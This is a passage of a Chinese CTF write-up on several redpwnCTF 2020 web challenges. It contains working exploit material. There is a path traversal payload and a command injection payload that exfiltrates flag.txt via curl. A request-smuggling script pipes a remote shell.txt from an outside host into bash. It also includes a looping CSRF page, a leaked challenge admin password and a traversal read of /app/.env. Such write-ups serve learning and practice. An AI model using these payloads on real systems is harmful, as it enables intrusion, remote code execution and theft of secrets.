+<p><img src="https://s1.ax1x.com/2020/07/01/NTKum8.png" srcset="/img/loading.gif" alt="NTKum8.png"></p>
+<p>传入数组的话就可以绕过过滤，想办法构造一个<code>/../../index.js</code>赋值给path就能读flag。<code>path.resolve()</code>，会有一个字符串拼接，如果传入数组，字符串+数组也为字符串。</p>
+<pre><code class="hljs pgsql">payload: ?<span class="hljs-type">path</span>[]=a&amp;<span class="hljs-type">path</span>[]=/../../<span class="hljs-keyword">index</span>.js</code></pre>
+
+<p>拼接起来是 path=”./public/a,/../../index.js”</p>
+<p>flag到手</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">const</span> flag = &#x27;flag&#123;tr<span class="hljs-number">4</span>v<span class="hljs-number">3</span>rsal_Tim<span class="hljs-number">3</span>&#125;&#x27;</code></pre>
+
+
+
+<h2 id="web-post-it-notes"><a href="#web-post-it-notes" class="headerlink" title="web/post-it-notes"></a>web/post-it-notes</h2><blockquote>
+<p>Request smuggling has many meanings. Prove you understand at least one of them at <a target="_blank" rel="noopener" href="http://2020.redpwnc.tf:31957/">2020.redpwnc.tf:31957</a>.</p>
+<p>Note: There are a lot of time-wasting things about this challenge. Focus on finding the vulnerability on the backend API and figuring out how to exploit it.</p>
+</blockquote>
+<p>给了源码，看到api/server.py中</p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_note</span>(<span class="hljs-params">nid</span>):</span>
+    stdout, stderr = subprocess.Popen(<span class="hljs-string">f&quot;cat &#x27;notes/<span class="hljs-subst">&#123;nid&#125;</span>&#x27; || echo it did not work btw&quot;</span>, shell = <span class="hljs-literal">True</span>, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()
+    <span class="hljs-keyword">if</span> stderr:
+        print(stderr) <span class="hljs-comment"># lemonthink</span>
+        <span class="hljs-keyword">return</span> &#123;&#125;
+    <span class="hljs-keyword">return</span> &#123;
+        <span class="hljs-string">&#x27;success&#x27;</span> : <span class="hljs-literal">True</span>,
+        <span class="hljs-string">&#x27;title&#x27;</span> : nid,
+        <span class="hljs-string">&#x27;contents&#x27;</span> : stdout.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors = <span class="hljs-string">&#x27;ignore&#x27;</span>)
+    &#125;</code></pre>
+
+<p>很明显有命令注入，nid是由web/server.py中<code>/notes/&lt;nid&gt;</code>传入</p>
+<p><code>payload：/notes/x&#39;;curl ip --data @flag.txt;&#39;</code></p>
+<p>尝试了很多直接反弹shell的payload，最后base64一下才成功反弹成功</p>
+<p><img src="https://s1.ax1x.com/2020/07/02/NqFIdH.png" srcset="/img/loading.gif" alt="NqFIdH.png"></p>
+<p>还有一种做法是ssrf+http走私,但是我复现的时候没成功</p>
+<p>web运行在外网，api是运行在内网且端口未知，端口在50000-51000</p>
+<pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    backend_port = random.randint(<span class="hljs-number">50000</span>, <span class="hljs-number">51000</span>)
+
+    at = threading.Thread(target = api_server.start, args = (backend_port,))
+    wt = threading.Thread(target = web_server.start, args = (backend_port,))</code></pre>
+
+<p><code>check_link()</code>可以探测内网，知道端口号后就可以走私，这里借用y1ng师傅的脚本</p>
+<pre><code class="hljs python"><span class="hljs-comment"># 探测端口</span>
+<span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
+url = <span class="hljs-string">&quot;http://2020.redpwnc.tf:31957/check-links&quot;</span>
+data = &#123;<span class="hljs-string">&quot;links&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000</span>,<span class="hljs-number">51000</span>):
+	api = <span class="hljs-string">&quot;http://localhost:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)
+	data[<span class="hljs-string">&quot;link&quot;</span>] = api
+	r = req.post(url, data=data)
+	<span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;true&quot;</span> <span class="hljs-keyword">in</span> r.text:
+		print(<span class="hljs-string">&quot;success:&quot;</span>+<span class="hljs-built_in">str</span>(i))
+		<span class="hljs-keyword">break</span>
+
+<span class="hljs-comment"># 走私，命令执行</span>
+<span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment">#-*- coding:utf-8 -*-</span>
+<span class="hljs-comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span>
+<span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote <span class="hljs-keyword">as</span> urlen
+
+url = <span class="hljs-string">&quot;http://2020.redpwnc.tf:31957/check-links&quot;</span>
+<span class="hljs-comment">#bash中用#把后面的命令过滤掉</span>
+smuggling = <span class="hljs-string">&quot;http://127.0.0.1\r\n\r\nGET /api/v1/notes/?title=&quot;</span> + urlen(<span class="hljs-string">&quot;&#x27;;curl http://gem-love.com/shell.txt|bash #&quot;</span>) + <span class="hljs-string">&quot; HTTP/1.1\r\n\r\n:50596&quot;</span>
+
+data = &#123;<span class="hljs-string">&quot;links&quot;</span>:smuggling&#125;
+req.post(url, data=data)</code></pre>
+
+
+
+<h2 id="web-cookie-recipes-v2"><a href="#web-cookie-recipes-v2" class="headerlink" title="web/cookie-recipes-v2"></a>web/cookie-recipes-v2</h2><blockquote>
+<p>I want to buy some of these recipes, but they are awfully expensive. Can you take a look?</p>
+<p>Site: <a target="_blank" rel="noopener" href="https://cookie-recipes-v2.2020.redpwnc.tf/">cookie-recipes-v2.2020.redpwnc.tf</a></p>
+</blockquote>
+<p>登陆进去是一个商店，可以买flag，账户里有的积分不出所料的不够。有一个可以拿积分的地方，可以提交一个url</p>
+<p><img src="https://s1.ax1x.com/2020/07/02/NL0Hvn.png" srcset="/img/loading.gif" alt="···"></p>
+<p>到这里就没什么思路了，给了源码,源码中有很多api接口，列出后面用到的几个</p>
+<p>api/getId        获取当前用户ID</p>
+<p>api/userInfo  获取用户信息，能看到密码</p>
+<p>api/gift            送积分</p>
+<p>详细看gift的代码</p>
+<pre><code class="hljs reasonml"><span class="hljs-comment">// Make sure request is from admin</span>
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">if</span> (!database.is<span class="hljs-constructor">Admin(<span class="hljs-params">id</span>)</span>) &#123;
+                res.write<span class="hljs-constructor">Head(403)</span>;
+                res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;
+                return;
+            &#125;
+        &#125; catch (error) &#123;
+            res.write<span class="hljs-constructor">Head(500)</span>;
+            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;
+            return;
+        &#125;
+<span class="hljs-comment">// Make sure user has not already received a gift</span>
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">if</span> (database.received<span class="hljs-constructor">Gift(<span class="hljs-params">user_id</span>)</span>) &#123;
+                util.respond<span class="hljs-constructor">JSON(<span class="hljs-params">res</span>, 200, <span class="hljs-params">result</span>)</span>; 
+                return;
+            &#125;
+        &#125; catch (error) &#123;
+            res.write<span class="hljs-constructor">Head(500)</span>;
+            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;
+            return;
+        &#125;
+
+<span class="hljs-comment">// Check admin password to prevent CSRF</span>
+        <span class="hljs-keyword">let</span> body;
+        <span class="hljs-keyword">try</span> &#123;
+            body = await util.parse<span class="hljs-constructor">Request(<span class="hljs-params">req</span>)</span>;
+        &#125; catch (error) &#123;
+            res.write<span class="hljs-constructor">Head(400)</span>;
+            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;
+            return;
+        &#125;
+<span class="hljs-comment">// User can only receive one gift</span>
+        <span class="hljs-keyword">try</span> &#123;
+            database.set<span class="hljs-constructor">Received(<span class="hljs-params">user_id</span>)</span>;
+        &#125; catch (error) &#123;
+            res.write<span class="hljs-constructor">Head(500)</span>;
+            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;
+        &#125;</code></pre>
+
+<p>要求是管理员，在送的时候需要输入管理员的密码，且只能一次队伍送一次，我们可以从</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cookie-recipes-v2.<span class="hljs-number">2020</span>.redpwnc.tf<span class="hljs-regexp">/api/u</span>serInfo?id=<span class="hljs-number">0</span></code></pre>
+
+<p>得到管理员密码，尝试登陆显示<code>IP address not allowed</code>,那只能通过url输入的地方尝试csrf，构造数据包应该是这样</p>
+<pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/gift?id=1141126652894855019</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: cookie-recipes-v2.2020.redpwnc.tf
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: text/plain
+<span class="hljs-attribute">Content-Length</span>: 47
+<span class="hljs-attribute">Connection</span>: close
+
+&#123;&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;&#125;</code></pre>
+
+<p>id从<code>/api/userInfo</code>获取，需要发送json，从老外wp上学一手用xml构造csrf</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+<span class="javascript">    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonreq</span>(<span class="hljs-params"></span>) </span>&#123;</span>
+<span class="javascript">        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest()</span>
+<span class="javascript">        xhr.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1141126652894855019&quot;</span>, <span class="hljs-literal">true</span>);</span>
+<span class="javascript">        xhr.withCredentials = <span class="hljs-literal">true</span>;</span>
+<span class="javascript">        xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;text/plain&quot;</span>);</span>
+<span class="javascript">        xhr.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;</span>&#125;));</span>
+    &#125;
+<span class="javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;</span>
+        jsonreq();
+    &#125;
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
+<p>因为只能送一次积分，所以重复发尝试绕过这个限制。把这个页面放自己服务器，可以用python起服务，直接访问</p>
+<pre><code class="hljs shell">python -m SimpleHTTPServer 4040</code></pre>
+
+<p>提交 <code>ip:4040/csrf.html</code>,发过去后查看自己的账号有足够的积分，买flag美滋滋</p>
+<p><img src="https://s1.ax1x.com/2020/07/03/NLg7nJ.png" srcset="/img/loading.gif" alt="NLg7nJ.png"></p>
+<p>ps.这题还有非预期，直接跨目录读/app/.env</p>
+<pre><code class="hljs shell">curl --path-as-is https://cookie-recipes-v2.2020.redpwnc.tf/../../../../app/.env</code></pre>
+
+
+
+<h2 id="web-Viper"><a href="#web-Viper" class="headerlink" title="web/Viper"></a>web/Viper</h2><blockquote>
+<p>Don’t you want your own ascii viper? No? Well here is Viper as a Service. If you experience any issues, send it <a target="_blank" rel="noopener" href="https://admin-bot.redpwnc.tf/submit?challenge=viper">here</a></p>
+<p>NOTE: The admin bot will only accept websites which match the following regex: <code>^http:\/\/2020\.redpwnc\.tf:31291\/viper\/[0-9a-f\-]+$</code></p>
+<p>Site: <a target="_blank" rel="noopener" href="http://2020.redpwnc.tf:31291/">2020.redpwnc.tf:31291</a></p>
+</blockquote>
+<p>这题涨知识了！老外真骚</p>
+<p>进去之后可以点击create创建个人页面，然后就没有什么有价值的东西了，给了源码</p>
+<pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"> *  @REDPWNCTF 2020</span>
+<span class="hljs-comment"> *  @AUTHOR Jim</span>
+<span class="hljs-comment"> */</span>
+
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);
+<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);
+<span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);
+<span class="hljs-keyword">const</span> redisStore = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;connect-redis&#x27;</span>)(session);
+<span class="hljs-keyword">const</span> mcache = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;memory-cache&#x27;</span>);
+<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid&#x27;</span>);
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);
+
+<span class="hljs-keyword">const</span> app = express();
+<span class="hljs-keyword">const</span> client  = redis.createClient(<span class="hljs-string">&#x27;redis://redis:6379&#x27;</span>);
+
+app.use(express.static(__dirname + <span class="hljs-string">&quot;/public&quot;</span>));
+app.use(bodyParser.json());
+app.use(session(&#123;
+    secret: <span class="hljs-string">&#x27;REDACTED&#x27;</span>, <span class="hljs-comment">// README it&#x27;s not literally REDACTED on server</span>
+    store: <span class="hljs-keyword">new</span> redisStore(&#123; <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;redis&#x27;</span>, <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>, <span class="hljs-attr">client</span>: client&#125;),
+    saveUninitialized: <span class="hljs-literal">false</span>,
+    resave: <span class="hljs-literal">false</span>
+&#125;));
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;
+    res.setHeader(<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>, <span class="hljs-string">&quot;default-src &#x27;self&#x27;&quot;</span>);
+    res.setHeader(<span class="hljs-string">&quot;X-Frame-Options&quot;</span>, <span class="hljs-string">&quot;DENY&quot;</span>)
+    <span class="hljs-keyword">return</span> next();
+&#125;);
+app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);
+
+<span class="hljs-keyword">const</span> middleware = <span class="hljs-function">(<span class="hljs-params">duration</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">return</span><span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;
+        <span class="hljs-keyword">const</span> key = <span class="hljs-string">&#x27;__rpcachekey__|&#x27;</span> + req.originalUrl + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>];
+        <span class="hljs-keyword">let</span> cachedBody = mcache.get(key);
+        <span class="hljs-keyword">if</span>(cachedBody)&#123;
+            res.send(cachedBody);
+            <span class="hljs-keyword">return</span>;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            res.sendResponse = res.send;
+            res.send = <span class="hljs-function">(<span class="hljs-params">body</span>) =&gt;</span> &#123;
+                mcache.put(key, body, duration * <span class="hljs-number">1000</span>);
+                res.sendResponse(body);
+            &#125;
+            next();
+        &#125;
+    &#125;
+&#125;;
+
+app.get(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> sess = req.session;
+
+    <span class="hljs-keyword">if</span>(!sess.viperId)&#123;
+        <span class="hljs-keyword">const</span> newViperId = uuidv4();
+
+        sess.viperId = newViperId;
+        sess.viperName = newViperId;
+    &#125;
+    res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+    res.render(<span class="hljs-string">&#x27;pages/index&#x27;</span>);
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/viper/:viperId&#x27;</span>, middleware(<span class="hljs-number">20</span>), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> viperId = req.params.viperId;
+    <span class="hljs-keyword">let</span> sess = req.session;
+
+    <span class="hljs-keyword">const</span> sessViperId = sess.viperId;
+    <span class="hljs-keyword">const</span> sessviperName = sess.viperName;
+
+    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;
+        sess.viperId = <span class="hljs-string">&quot;admin_account&quot;</span>;
+        sess.viperName = <span class="hljs-string">&quot;admin_account&quot;</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span>(viperId === sessViperId || sess.isAdmin)&#123;
+        res.render(<span class="hljs-string">&#x27;pages/viper&#x27;</span>, &#123;
+            name: sessviperName,
+            analyticsUrl: <span class="hljs-string">&#x27;http://&#x27;</span> + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>] + <span class="hljs-string">&#x27;/analytics?ip_address=&#x27;</span> + req.headers[<span class="hljs-string">&#x27;x-real-ip&#x27;</span>]
+        &#125;);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+    &#125;
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/editviper&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> viperName = req.query.viperName;
+    <span class="hljs-keyword">let</span> sess = req.session;
+
+    <span class="hljs-keyword">if</span>(sess.viperId)&#123;
+        sess.viperName = viperName;
+        res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+    &#125;
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/logout&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> sess = req.session;
+
+    sess.destroy();
+
+    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/analytics&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> ip_address = req.query.ip_address;
+
+    <span class="hljs-keyword">if</span>(!ip_address)&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    client.exists(ip_address, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;
+            client.incr(ip_address, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                <span class="hljs-keyword">if</span>(err)&#123;
+                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                    <span class="hljs-keyword">return</span>;
+                &#125;
+                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! &quot;</span> + ip_address + <span class="hljs-string">&quot; has visited the site &quot;</span> + reply + <span class="hljs-string">&quot; times.&quot;</span>);
+            &#125;);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            client.set(ip_address, <span class="hljs-number">1</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                <span class="hljs-keyword">if</span>(err)&#123;
+                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                    <span class="hljs-keyword">return</span>;
+                &#125;
+                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! &quot;</span> + ip_address + <span class="hljs-string">&quot; has visited the site 1 time.&quot;</span>);
+            &#125;);
+        &#125;
+    &#125;);
+ &#125;);
+
+ <span class="hljs-comment">// README: This is the code used to generate the cookie stored on the admin user</span>
+
+ app.get(<span class="hljs-string">&#x27;/admin/generate/:secret_token&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> secret_token = <span class="hljs-string">&quot;REDACTED&quot;</span>; <span class="hljs-comment">// README it&#x27;s not literally READACTED on chall server</span>
+
+    <span class="hljs-keyword">if</span>(req.params.secret_token === secret_token)&#123;
+        <span class="hljs-keyword">let</span> sess = req.session;
+
+        sess.viperId = <span class="hljs-string">&quot;admin_account&quot;</span>;
+        sess.viperName = <span class="hljs-string">&quot;admin_account&quot;</span>;
+        sess.isAdmin = <span class="hljs-literal">true</span>;
+    &#125;
+
+    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+ &#125;);
+
+ <span class="hljs-keyword">const</span> getRandomInt = <span class="hljs-function">(<span class="hljs-params">min, max</span>) =&gt;</span> &#123;
+    min = <span class="hljs-built_in">Math</span>.ceil(min);
+    max = <span class="hljs-built_in">Math</span>.floor(max);
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min + <span class="hljs-number">1</span>)) + min;
+ &#125;;
+
+ app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> sess = req.session;
+
+    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;
+        client.exists(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+            <span class="hljs-keyword">if</span>(err)&#123;
+                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                <span class="hljs-keyword">return</span>;
+            &#125;
+            <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;
+                client.get(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                    <span class="hljs-keyword">if</span>(err)&#123;
+                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                        <span class="hljs-keyword">return</span>;
+                    &#125;
+                    res.render(<span class="hljs-string">&#x27;pages/admin&#x27;</span>, &#123;
+                        csrfToken: Buffer.from(reply).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)
+                    &#125;);
+                &#125;);
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-keyword">const</span> randomToken = getRandomInt(<span class="hljs-number">10000</span>, <span class="hljs-number">1000000000</span>);
+                client.set(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, randomToken, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                    <span class="hljs-keyword">if</span>(err)&#123;
+                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                        <span class="hljs-keyword">return</span>;
+                    &#125;
+                    res.render(<span class="hljs-string">&#x27;pages/admin&#x27;</span>, &#123;
+                        csrfToken: Buffer.from(randomToken).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)
+                    &#125;);
+                &#125;);
+            &#125;
+        &#125;);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+    &#125;
+ &#125;);
+
+ app.get(<span class="hljs-string">&#x27;/admin/create&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> sess = req.session;
+    <span class="hljs-keyword">let</span> viperId = req.query.viperId;
+    <span class="hljs-keyword">let</span> csrfToken = req.query.csrfToken;
+
+    <span class="hljs-keyword">const</span> v4regex = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-4[0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>);
+    <span class="hljs-keyword">if</span>(!viperId.match(v4regex))&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span>(!viperId || !csrfToken)&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;
+        client.exists(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+            <span class="hljs-keyword">if</span>(err)&#123;
+                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                <span class="hljs-keyword">return</span>;
+            &#125;
+            <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;
+                client.get(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                    <span class="hljs-keyword">if</span>(err)&#123;
+                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                        <span class="hljs-keyword">return</span>;
+                    &#125;
+                    <span class="hljs-keyword">if</span>(reply === Buffer.from(csrfToken, <span class="hljs-string">&#x27;base64&#x27;</span>).toString(<span class="hljs-string">&#x27;ascii&#x27;</span>))&#123;
+                        <span class="hljs-keyword">const</span> randomToken = getRandomInt(<span class="hljs-number">1000000</span>, <span class="hljs-number">10000000000</span>);
+                        client.set(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, randomToken, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;
+                            <span class="hljs-keyword">if</span>(err)&#123;
+                                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);
+                                <span class="hljs-keyword">return</span>;
+                            &#125;
+                        &#125;);
+
+                        sess.viperId = viperId;
+                        sess.viperName = fs.readFileSync(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>).toString();
+
+                        res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));
+                    &#125;<span class="hljs-keyword">else</span>&#123;
+                        res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&quot;Unauthorized&quot;</span>);
+                    &#125;
+                &#125;);
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&quot;Unauthorized&quot;</span>);
+            &#125;
+        &#125;);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);
+    &#125;
+ &#125;);
+
+app.listen(<span class="hljs-number">31337</span>, <span class="hljs-function">() =&gt;</span> &#123;
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;express listening on 31337&quot;</span>);
+&#125;);
+</code></pre>
+
+<p>可以看到获取flag需要<code> app.get(&#39;/admin/create&#39;, function(req, res)</code>需要这个路由创建一个页面，把读取的flag.txt放入<code>viperName</code>。访问<a target="_blank" rel="noopener" href="http://2020.redpwnc.tf:31291/viper/+">http://2020.redpwnc.tf:31291/viper/+</a> 对应的viperId,就能看到flag。但是这个路由只能admin访问，所以考虑能不能xss让admin访问这个页面，题目描述上给 机器人的地址且说明了只接受<code>^http:\/\/2020\.redpwnc\.tf:31291\/viper\/[0-9a-f\-]+$</code>这样的地址，也就是我们创建的页面，从中看看有没有利用点。</p>
